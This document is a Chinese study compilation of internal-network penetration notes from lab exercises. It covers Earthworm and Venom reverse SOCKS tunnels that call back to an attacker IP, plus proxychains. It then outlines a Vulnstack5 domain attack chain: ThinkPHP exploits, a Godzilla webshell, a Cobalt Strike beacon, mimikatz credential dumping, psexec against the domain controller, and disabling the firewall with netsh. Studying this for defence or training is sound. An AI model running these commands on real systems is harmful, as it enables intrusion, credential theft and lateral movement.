> 个人内网渗透作业合集整理。工具：Earthworm(ew)、Venom、proxychains、BurpSuite、哥斯拉(Godzilla)、CobaltStrike(CS)。

## 1. 内网穿透基础概念

```text
正向穿透：kali(5555) → waf1 → 跳板A(4444) → waf2 → target(3389)
反向穿透：目标回连到攻击机（适用于目标不出网）

工具定位：
- Earthworm(ew)  轻量 socks 代理，正向/反向
- Venom         多级代理，支持 socks
- proxychains    终端命令走代理
- 猕猴桃(mimikatz)  抓取密码
- Tunna / ssh  其他穿透方式
```

## 2. Earthworm + BurpSuite + 哥斯拉 实战

```text
前置：ms17-010（永恒之蓝）拿下 win7 跳板机
```

```bash
# ① 上传 ew 到跳板机（msf 会话中）
upload /root/ew_for_win_32.exe C://Windows//Temp

# ② kali 攻击机后台起 socks 代理（监听 8082，转发到 8088）
./ew_for_linux -s rcsocks -l 8082 -e 8088 &

# ③ 跳板机反弹 socks 到 kali
execute -f "c:\\windows\\temp\\ew_for_win_32.exe -s rssocks -d 192.168.248.129 -e 8088"

# ④ 配置 proxychains（/etc/proxychains4.conf）
# 末尾加: socks5 127.0.0.1 8082

# ⑤ 通过代理访问内网
proxychains rdesktop 192.168.52.129
# 或让 burpsuite 走代理抓内网包
proxychains java -jar /usr/share/burpsuite/burpsuite.jar
# 或哥斯拉走代理连内网
proxychains java -jar /root/Godzilla.jar
```

```text
验证连通：跳板机 netstat -ant 应显示已连接 kali 8088
浏览器代理：firefox → Manual proxy → SOCKS 192.168.248.129:8082
内网 getshell：用 DVWA 文件上传漏洞传木马，哥斯拉连接
```

## 3. Venom 三层穿透

```bash
# ① 永恒之蓝拿第一台跳板
# ② 上传 agent.exe
upload /root/Venom/agent.exe c:\windows\temp
# ③ 跳板 agent 反向连 kali 9999
execute -f "c:\windows\temp\agent.exe -rhost 192.168.1.15 -rport 9999"
# ④ admin node 下 show 节点，goto 1
# ⑤ 在 node 1 执行 socks 1080，kali 监听 1080
socks 1080
```

## 4. Vulnstack5 域渗透实战

### 4.1 Web 打点（ThinkPHP）

```text
1. nmap 扫到 80/135/3306
2. 浏览器访问发现 ThinkPHP 框架
3. ThinkPHP 综合利用工具扫描 → 多个漏洞：
   - tp5_construct_code_exec_1/2（代码执行）
   - tp5_dbinfo_leak（数据库信息泄露）
   - tp5_invoke_func_code_exec_1（命令执行）
   - tp5_file_include（文件包含，可读 win.ini）
4. 用 tp5_invoke_func_code_exec_1 执行命令
5. 发现域：sun，用户名 Administrator
```

### 4.2 上线与横向

```text
1. 哥斯拉生成 php shell → getshell 上传 → 哥斯拉连接拿 shell
2. CS 创建监听，生成 Windows 木马，通过哥斯拉上传到靶机并启动 → CS 上线
3. 抓取密码明文（mimikatz）
4. 内网扫描，发现 192.168.138.136（web）和 .138（域控，域名 sum.com）
5. Beacon 中 shell ping sum.com 确认域控 = 192.168.138.138
```

### 4.3 psexec 打域控（出网限制处理）

```text
问题：138 网段不出网，只有单网卡的域控攻击成功后无法上线
方案：在 web 服务器(192.168.138.136)上开监听做代理，让域控回连 web 服务器
1. 在 Web 服务器上创建监听（DC 监听）
2. psexec 攻击域控，listener 选 DC 监听
3. 若回连失败，检查防火墙：
   shell netsh firewall show state        # 发现全开
   shell netsh advfirewall set allprofiles state off   # 关闭
4. 成功回连 → 获得 192.168.138.136 与 .138（域控）两台机器控制权
```

---

> **一句话总结**：内网渗透 = 打点（Web 漏洞）→ 上线（哥斯拉/CS）→ 横向（代理/穿透）→ 提权/域渗透（mimikatz/psexec）。**出网限制**是常考点——目标不出网时，用已控机器开监听当"摆渡机"，让目标回连。
